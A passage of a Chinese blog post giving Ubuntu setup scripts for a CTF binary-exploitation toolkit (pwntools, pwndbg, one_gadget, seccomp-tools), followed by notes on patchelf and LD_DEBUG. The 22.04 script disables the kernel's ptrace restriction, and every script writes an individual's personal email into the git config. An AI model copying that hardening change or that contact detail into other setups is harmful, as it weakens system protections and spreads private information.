class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># necessary software</span></span><br><span class="line"><span class="built_in">sudo</span> add-apt-repository -y ppa:brightbox/ruby-ng \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get update \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get install -y libffi-dev libsqlite3-dev libbz2-dev liblzma-dev zlib1g-dev tk-dev libncursesw5-dev libgdbm-dev openssl libssl-dev libreadline-dev uuid-dev \</span><br><span class="line">    texinfo \</span><br><span class="line">    patchelf strace \</span><br><span class="line">    gcc gcc-multilib g++-multilib nasm \</span><br><span class="line">    git wget curl xsel \</span><br><span class="line">    qemu-system docker docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;registry-mirrors&quot;:[</span></span><br><span class="line"><span class="string">        &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span></span><br><span class="line"><span class="string">        &quot;https://registry.docker-cn.com&quot;</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">sudo</span> usermod -aG docker <span class="variable">$&#123;USER&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python</span></span><br><span class="line">wget https://www.python.org/ftp/python/3.8.10/Python-3.8.10.tar.xz \</span><br><span class="line">    &amp;&amp; tar -xvf Python-3.8.10.tar.xz -C ~ \</span><br><span class="line">    &amp;&amp; <span class="built_in">rm</span> -rf Python-3.8.10.tar.xz \</span><br><span class="line">    &amp;&amp; (<span class="built_in">cd</span> ~/Python-3.8.10 &amp;&amp; <span class="built_in">mkdir</span> build &amp;&amp; <span class="built_in">cd</span> build &amp;&amp; ../configure --enable-shared --exec-prefix=/usr &amp;&amp; make -j $(<span class="built_in">nproc</span>) &amp;&amp; <span class="built_in">sudo</span> make -j $(<span class="built_in">nproc</span>) install) \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> update-alternatives --install /usr/bin/python3 python3 /usr/local/bin/python3.8 150 \</span><br><span class="line">    &amp;&amp; wget https://bootstrap.pypa.io/get-pip.py \</span><br><span class="line">    &amp;&amp; python3 get-pip.py --user \</span><br><span class="line">    &amp;&amp; <span class="built_in">rm</span> -rf get-pip.py \</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb</span></span><br><span class="line">wget http://ftp.gnu.org/gnu/gdb/gdb-9.2.tar.xz \</span><br><span class="line">    &amp;&amp; tar -xvf gdb-9.2.tar.xz -C ~ \</span><br><span class="line">    &amp;&amp; <span class="built_in">rm</span> -rf gdb-9.2.tar.xz \</span><br><span class="line">    &amp;&amp; (<span class="built_in">cd</span> ~/gdb-9.2 &amp;&amp; <span class="built_in">mkdir</span> build &amp;&amp; <span class="built_in">cd</span> build &amp;&amp; ../configure --with-python=/usr/bin/python3 &amp;&amp; make -j $(<span class="built_in">nproc</span>) &amp;&amp; <span class="built_in">sudo</span> make -j $(<span class="built_in">nproc</span>) install) \</span><br><span class="line"></span><br><span class="line"><span class="comment"># neovim</span></span><br><span class="line">wget -O ~/nvim.appimage https://ghproxy.com/https://github.com/neovim/neovim/releases/download/stable/nvim.appimage \</span><br><span class="line">    &amp;&amp; <span class="built_in">chmod</span> +x ~/nvim.appimage \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> <span class="built_in">ln</span> -sf ~/nvim.appimage /usr/bin/vi \</span><br><span class="line">    &amp;&amp; <span class="built_in">mkdir</span> ~/.config/nvim \</span><br><span class="line">    &amp;&amp; <span class="built_in">cat</span> &gt; ~/.config/nvim/init.vim &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">set clipboard+=unnamedplus</span></span><br><span class="line"><span class="string">set nu</span></span><br><span class="line"><span class="string">set tabstop=4</span></span><br><span class="line"><span class="string">set shiftwidth=4</span></span><br><span class="line"><span class="string">set softtabstop=4</span></span><br><span class="line"><span class="string">set expandtab</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># git</span></span><br><span class="line">git config --global user.name <span class="string">&quot;hawk&quot;</span> \</span><br><span class="line">    &amp;&amp; git config --global user.email 18801353760@163.com \</span><br><span class="line">    &amp;&amp; git config --global core.editor vi</span><br><span class="line"></span><br><span class="line"><span class="comment"># python</span></span><br><span class="line">python3 -m pip install -U --force-reinstall pip -i https://pypi.tuna.tsinghua.edu.cn/simple \</span><br><span class="line">    &amp;&amp; python3 -m pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line">python3 -m pip install pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ropper</span></span><br><span class="line">python3 -m pip install ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line">git config --global url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf <span class="string">&quot;https://github.com/&quot;</span> \</span><br><span class="line">    &amp;&amp; git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git ~/pwndbg \</span><br><span class="line">    &amp;&amp; (<span class="built_in">cd</span> ~/pwndbg &amp;&amp; ./setup.sh) \</span><br><span class="line">    &amp;&amp; git config --global --<span class="built_in">unset</span> url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf \</span><br><span class="line">    &amp;&amp; python3 -m pip install pwnlib psutil</span><br><span class="line"></span><br><span class="line"><span class="comment"># ruby</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get update \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get install -y ruby2.6 ruby2.6-dev \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> gem install one_gadget seccomp-tools</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="ubuntu18-04"><a href="#ubuntu18-04" class="headerlink" title="ubuntu18.04"></a>ubuntu18.04</h2>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">set</span> -x</span><br><span class="line"></span><br><span class="line"><span class="comment"># apt mirror</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># necessary software</span></span><br><span class="line"><span class="built_in">sudo</span> add-apt-repository -y ppa:brightbox/ruby-ng \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get update \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get install -y python3 python3-dev python3-pip \</span><br><span class="line">    gdb patchelf strace \</span><br><span class="line">    gcc gcc-multilib g++-multilib nasm \</span><br><span class="line">    git wget curl neovim xsel \</span><br><span class="line">    qemu-system docker docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;registry-mirrors&quot;:[</span></span><br><span class="line"><span class="string">        &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span></span><br><span class="line"><span class="string">        &quot;https://registry.docker-cn.com&quot;</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">sudo</span> usermod -aG docker <span class="variable">$&#123;USER&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># neovim</span></span><br><span class="line"><span class="built_in">mkdir</span> ~/.config/nvim \</span><br><span class="line">    &amp;&amp; <span class="built_in">cat</span> &gt; ~/.config/nvim/init.vim &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">set clipboard+=unnamedplus</span></span><br><span class="line"><span class="string">set nu</span></span><br><span class="line"><span class="string">set tabstop=4</span></span><br><span class="line"><span class="string">set shiftwidth=4</span></span><br><span class="line"><span class="string">set softtabstop=4</span></span><br><span class="line"><span class="string">set expandtab</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># git</span></span><br><span class="line">git config --global user.name <span class="string">&quot;hawk&quot;</span> \</span><br><span class="line">    &amp;&amp; git config --global user.email 18801353760@163.com \</span><br><span class="line">    &amp;&amp; git config --global core.editor vi</span><br><span class="line"></span><br><span class="line"><span class="comment"># python</span></span><br><span class="line">python3 -m pip install -U --force-reinstall pip -i https://pypi.tuna.tsinghua.edu.cn/simple \</span><br><span class="line">    &amp;&amp; python3 -m pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line">python3 -m pip install pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ropper</span></span><br><span class="line">python3 -m pip install ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line">git config --global url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf <span class="string">&quot;https://github.com/&quot;</span> \</span><br><span class="line">    &amp;&amp; git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git ~/pwndbg \</span><br><span class="line">    &amp;&amp; (<span class="built_in">cd</span> ~/pwndbg &amp;&amp; ./setup.sh) \</span><br><span class="line">    &amp;&amp; git config --global --<span class="built_in">unset</span> url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf \</span><br><span class="line">    &amp;&amp; python3 -m pip install pwnlib psutil</span><br><span class="line"></span><br><span class="line"><span class="comment"># ruby</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get update \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get install -y ruby2.6 ruby2.6-dev \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> gem install one_gadget seccomp-tools</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ubuntu20-04"><a href="#ubuntu20-04" class="headerlink" title="ubuntu20.04"></a>ubuntu20.04</h2>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">set</span> -x</span><br><span class="line"></span><br><span class="line"><span class="comment"># apt mirror</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># necessary software</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get update \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get install -y python3 python3-dev python3-pip \</span><br><span class="line">    gdb patchelf strace \</span><br><span class="line">    ruby ruby-dev \</span><br><span class="line">    gcc gcc-multilib g++-multilib nasm \</span><br><span class="line">    git wget curl neovim \</span><br><span class="line">    qemu-system docker docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;registry-mirrors&quot;:[</span></span><br><span class="line"><span class="string">        &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span></span><br><span class="line"><span class="string">        &quot;https://registry.docker-cn.com&quot;</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">sudo</span> usermod -aG docker <span class="variable">$&#123;USER&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># neovim</span></span><br><span class="line"><span class="built_in">mkdir</span> ~/.config/nvim \</span><br><span class="line">    &amp;&amp; <span class="built_in">cat</span> &gt; ~/.config/nvim/init.vim &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">set nu</span></span><br><span class="line"><span class="string">set tabstop=4</span></span><br><span class="line"><span class="string">set shiftwidth=4</span></span><br><span class="line"><span class="string">set softtabstop=4</span></span><br><span class="line"><span class="string">set expandtab</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># git</span></span><br><span class="line">git config --global user.name <span class="string">&quot;hawk&quot;</span> \</span><br><span class="line">    &amp;&amp; git config --global user.email 18801353760@163.com \</span><br><span class="line">    &amp;&amp; git config --global core.editor vi</span><br><span class="line"></span><br><span class="line"><span class="comment"># python</span></span><br><span class="line">python3 -m pip install -U --force-reinstall pip -i https://pypi.tuna.tsinghua.edu.cn/simple \</span><br><span class="line">    &amp;&amp; python3 -m pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line">python3 -m pip install pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ropper</span></span><br><span class="line">python3 -m pip install ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line">git config --global url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf <span class="string">&quot;https://github.com/&quot;</span> \</span><br><span class="line">    &amp;&amp; git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git ~/pwndbg \</span><br><span class="line">    &amp;&amp; (<span class="built_in">cd</span> ~/pwndbg &amp;&amp; ./setup.sh) \</span><br><span class="line">    &amp;&amp; git config --global --<span class="built_in">unset</span> url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf \</span><br><span class="line">    &amp;&amp; python3 -m pip install pwnlib psutil</span><br><span class="line"></span><br><span class="line"><span class="comment"># ruby</span></span><br><span class="line"><span class="built_in">sudo</span> gem install one_gadget seccomp-tools</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ubuntu22-04"><a href="#ubuntu22-04" class="headerlink" title="ubuntu22.04"></a>ubuntu22.04</h2>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">set</span> -x</span><br><span class="line"></span><br><span class="line"><span class="comment"># apt mirror</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># necessary software</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get update \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get install -y python3 python3-dev python3-pip \</span><br><span class="line">    gdb patchelf strace \</span><br><span class="line">    ruby ruby-dev \</span><br><span class="line">    gcc gcc-multilib g++-multilib nasm \</span><br><span class="line">    git wget curl neovim \</span><br><span class="line">    qemu-system docker docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb</span></span><br><span class="line"><span class="built_in">sudo</span> sed -i <span class="string">&quot;s/^kernel.yama.ptrace_scope = 1$/kernel.yama.ptrace_scope = 0/&quot;</span> /etc/sysctl.d/10-ptrace.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;registry-mirrors&quot;:[</span></span><br><span class="line"><span class="string">        &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span></span><br><span class="line"><span class="string">        &quot;https://registry.docker-cn.com&quot;</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">sudo</span> usermod -aG docker <span class="variable">$&#123;USER&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># neovim</span></span><br><span class="line"><span class="built_in">mkdir</span> ~/.config/nvim \</span><br><span class="line">    &amp;&amp; <span class="built_in">cat</span> &gt; ~/.config/nvim/init.vim &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">set nu</span></span><br><span class="line"><span class="string">set tabstop=4</span></span><br><span class="line"><span class="string">set shiftwidth=4</span></span><br><span class="line"><span class="string">set softtabstop=4</span></span><br><span class="line"><span class="string">set expandtab</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># git</span></span><br><span class="line">git config --global user.name <span class="string">&quot;hawk&quot;</span> \</span><br><span class="line">    &amp;&amp; git config --global user.email 18801353760@163.com \</span><br><span class="line">    &amp;&amp; git config --global core.editor vi</span><br><span class="line"></span><br><span class="line"><span class="comment"># python</span></span><br><span class="line">python3 -m pip install -U --force-reinstall pip -i https://pypi.tuna.tsinghua.edu.cn/simple \</span><br><span class="line">    &amp;&amp; python3 -m pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line">python3 -m pip install pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ropper</span></span><br><span class="line">python3 -m pip install ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line">git config --global url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf <span class="string">&quot;https://github.com/&quot;</span> \</span><br><span class="line">    &amp;&amp; git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git ~/pwndbg \</span><br><span class="line">    &amp;&amp; (<span class="built_in">cd</span> ~/pwndbg &amp;&amp; ./setup.sh) \</span><br><span class="line">    &amp;&amp; git config --global --<span class="built_in">unset</span> url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf \</span><br><span class="line">    &amp;&amp; python3 -m pip install pwnlib psutil</span><br><span class="line"></span><br><span class="line"><span class="comment"># ruby</span></span><br><span class="line"><span class="built_in">sudo</span> gem install one_gadget seccomp-tools</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h1><p>  <strong>CTF</strong>的<strong>PWN</strong>类型题目中，会有复杂的动态链接库和依赖关系，我们需要修改这些二进制的信息，使其可以在本地环境下正常运行，可以通过<strong>patchelf</strong>程序进行实现。</p><h2 id="dynamic-loader"><a href="#dynamic-loader" class="headerlink" title="dynamic loader"></a>dynamic loader</h2><p>  如果没有正确的动态载入器，我们会导致程序执行错误或无法找到程序，因此可以通过如下命令修改指定的动态载入器地址<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter [path] [execute]</span><br></pre></td></tr></table></figure></p><h2 id="runtime-path"><a href="#runtime-path" class="headerlink" title="runtime path"></a>runtime path</h2><p>  有时程序需要使用特殊的动态链接库，因此其指定了动态链接库的首要查找路径，即<strong>runtime path(rpath)</strong>。我们在本地可以通过修改<strong>rpath</strong>字段的值，从而让其在本地的对应路径下去寻找动态链接库，命令如下<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-rpath [path] [execute]</span><br></pre></td></tr></table></figure></p><h1 id="LD-环境变量"><a href="#LD-环境变量" class="headerlink" title="LD_*环境变量"></a>LD_*环境变量</h1><p>  由于程序的动态链接和依赖关系十分的复杂，因此linux本身也提供了一些环境变量，方便进行程序动态链接和依赖的查找和调试</p><h2 id="LD-DEBUG"><a href="#LD-DEBUG" class="headerlink" title="LD_DEBUG"></a>LD_DEBUG</h2><p>  实际上通过设置<strong>LD_DEBUG</strong>变量，可以方便的调试程序动态链接的各种过程，比如</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_DEBUG=libs [execute]</span><br></pre></td></tr></table></figure><p>  终端会输出程序寻找动态库的全过程，然后接着是正常的执行过程。</p><p>  <strong>LD_DEBUG</strong>中包含多个可选的值，如<strong>libs</strong>、<strong>symbols</strong>等，可以通过设置<strong>help</strong>值，然后屏幕会输出所有的可选项及其含义。</p><h2 id="LD-LIBRARY-PATH"><a href="#LD-LIBRARY-PATH" class="headerlink" 